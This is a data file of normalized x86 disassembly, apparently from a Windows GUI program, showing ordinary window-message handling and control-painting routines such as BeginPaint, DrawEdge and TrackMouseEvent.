push 0x1
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_3a7a494
mov edx [ ebp - 0x4 ]
movzx ecx [ ebp - 0xd ]
call sub_3ab4a48
mov [ ebp - 0x14 ] eax
dec edi
cmp edi 0xffffffff
jne r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_3a7a494
call sub_3ab497c
pop ecx
test al al
jne r-xdata
sub_3ab4b0c
push ebx
push esi
push edi
add esp 0xfffffed8
mov ebx ecx
mov edi edx
mov esi eax
call GetMessagePos
call sub_3a67380
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
mov ecx esp
lea edx [ esp + 0xc ]
mov eax esi
call sub_3aaf6c0
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_3ab4a48
mov ebx eax
xor eax eax
cmp esi ebx
je r-xdata
mov eax [ esp ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0x118 ] eax
mov eax [ esp ]
sub eax [ ebx + 0x40 ]
mov [ esp + 0x114 ] eax
mov eax [ esp + 0x4 ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x118 ] eax
jmp r-xdata
add eax 0xfffffdff
sub eax 0x2
jb r-xdata
add eax 0xffffff5f
sub eax 0x2
jb r-xdata
movzx eax [ edi + 0x8 ]
mov [ esp + 0x11c ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x124 ] eax
movzx eax [ edi + 0xa ]
cmp eax 0x201
jge r-xdata
mov [ esp + 0x120 ] 0x0
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
lea eax [ esp + 0x14 ]
push eax
call GetKeyboardState
lea eax [ esp + 0x14 ]
call sub_3ac453c
mov [ esp + 0x121 ] al
lea eax [ esp + 0x114 ]
push eax
xor ecx ecx
mov edx 0xb04b
mov eax ebx
call sub_3ab0e78
mov [ edi + 0xc ] eax
mov al 0x1
jmp r-xdata
mov [ esp + 0x120 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
dec eax
sub eax 0x2
jb r-xdata
add esp 0x128
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x120 ] 0x2
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ esp + 0x120 ] 0x0
sub_3ab4c58
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7c38
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x8 ] eax
movsx eax [ esp + 0x8 ]
mov [ esp + 0xc ] eax
movsx eax [ esp + 0xa ]
mov [ esp + 0x10 ] eax
push 0x0
push 0x0
lea edx [ esp + 0x14 ]
xor ecx ecx
mov eax ebx
call sub_3ab4a48
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x14 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0x16 ] ax
mov eax [ esp + 0x14 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_3ab0e78
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_3ab4d0c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx eax
cmp edx 0x100
jge r-xdata
cmp edx 0xb047
jg r-xdata
cmp edx 0x1f
jg r-xdata
sub edx 0xb04a
je r-xdata
je r-xdata
sub edx 0x21
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
sub edx 0x4
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
add edx 0xffffff00
sub edx 0xa
jb r-xdata
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_3ab4b0c
test al al
je r-xdata
sub edx 0x63
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
mov ebx eax
call GetCapture
cmp ebx eax
jne r-xdata
sub edx 0x7
je r-xdata
xor eax eax
push ebp
push sub_3ab51fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab0f54
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x128
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab03ec
test al al
jne r-xdata
add edx 0xffffff0a
sub edx 0xb
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab0f54
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0xffffffff
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
dec edx
je r-xdata
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
call sub_3abdd24
cmp [ eax + 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb047
mov eax ebx
call sub_3ab0e78
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp eax 0x200
jne r-xdata
sub edx 0x98
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
movsx eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
movsx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x0
lea ecx [ ebp - 0x34 ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_3aaf6c0
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_3ab4a48
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
jmp r-xdata
push r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push 0x77
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab4c58
test al al
je r-xdata
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0xa ]
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
call sub_3a78df4
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3aaf610
call sub_3aac92c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab0f54
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_3ab0e78
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ebx [ rw-data ]
lea eax [ ebp - 0x10 ]
mov dl 0x1
call sub_3aae0f8
mov ebx eax
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb014
call sub_3ab0e78
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x23c ]
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x23c ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call DefWindowProcA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] 0x1
mov [ ebp - 0x2c ] 0x10
mov [ ebp - 0x28 ] 0x2
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call _TrackMouseEvent
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb014
call sub_3ab0e78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x23c ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov [ edx + 0x23c ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_3a83978
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
call sub_3a83738
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
cmp eax [ rw-data ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
xor ecx ecx
mov edx 0xb013
call sub_3ab0e78
sub_3ab522c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_3ab1224
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call __imp_SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_3ab0e78
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x1a4 ]
call sub_3a89b18
call sub_3a88d54
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x1a4 ]
call sub_3a89b74
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_3aaf71c
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x1b4 ]
push eax
mov eax [ esi + 0x1a8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_3ab5334
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_3aac5e0
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_3ab0e78
mov [ esi + 0xc ] eax
mov bl 0x1
sub_3ab5368
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_3ab54c7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1cc ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call BeginPaint
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_3ab548a
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edi 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
jmp r-xdata
dec edi
je r-xdata
inc ebx
xor esi esi
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3ab5500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab54ce
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call EndPaint
inc esi
dec ebx
jne r-xdata
test [ eax + 0x55 ] 0x8
jne r-xdata
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x55 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_3a7a494
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov ecx [ eax + 0x44 ]
add ecx [ eax + 0x4c ]
push ecx
mov edx [ eax + 0x40 ]
mov ecx edx
add ecx [ eax + 0x48 ]
push ecx
mov ecx [ eax + 0x44 ]
push ecx
push edx
mov eax [ ebp - 0x10 ]
push eax
call ExcludeClipRect
mov edi eax
cmp edi 0x1
je r-xdata
sub_3ab5500
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov edx ebx
call sub_3a7a4f0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1cc ]
mov edx [ ebp - 0xc ]
call sub_3a7a494
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
dec edi
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx [ ebp - 0xc ]
call sub_3a7a494
mov ebx eax
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0x44 ]
mov eax esi
mov edx [ ebp - 0x18 ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
mov ebx [ eax + 0x40 ]
mov ecx ebx
mov eax [ ebp - 0x18 ]
add ecx [ eax + 0x48 ]
mov edx esi
mov eax ebx
call sub_3a78e1c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RectVisible
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x55 ] 0x8
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_3a88d54
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_3a78e1c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax 0xff000014
call sub_3a88d54
push eax
call CreateSolidBrush
mov esi eax
push esi
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_3a78e1c
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FrameRect
push esi
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_3ab56ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x44 ]
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x8 ]
call sub_3aae18c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x18 ]
call sub_3ab0e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x18 ]
or [ eax + 0x54 ] 0x80
test [ ebx + 0x55 ] 0x8
jne r-xdata
sub_3ab57e0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ab5876
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
push eax
call ExcludeClipRect
call sub_3abdd24
lea ecx [ ebp - 0x18 ]
mov dl 0x2
call sub_3abdf94
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call sub_3abdd24
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_3abdee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab587d
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call RestoreDC
retn
sub_3ab5890
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x80
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3ab5ac9
push [ fs : edx ]
mov [ fs : edx ] esp
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3aae18c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
xor esi esi
xor ebx ebx
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov ebx 0xa
mov esi 0x200f
jmp r-xdata
cmp ebx 0xa
jne r-xdata
mov ebx 0x3
mov esi 0xa00f
test esi esi
je r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0x14
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx 0xf
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
push esi
push ebx
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call DrawEdge
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3aae18c
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab5ad0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call SetRect
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3abdccc
test al al
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
or eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x50 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3ab57e0
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
not edx
and edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] edx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3ab57e0
jmp r-xdata
inc esi
dec ebx
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x8 ]
call sub_3ab5890
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3aae18c
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_3a7a494
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_3ab5ae8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab5368
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab3ba4
test eax eax
jne r-xdata
call sub_3a91b8c
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call BeginPaint
mov esi eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
push eax
push esi
call CreateCompatibleBitmap
mov [ ebp - 0xc ] eax
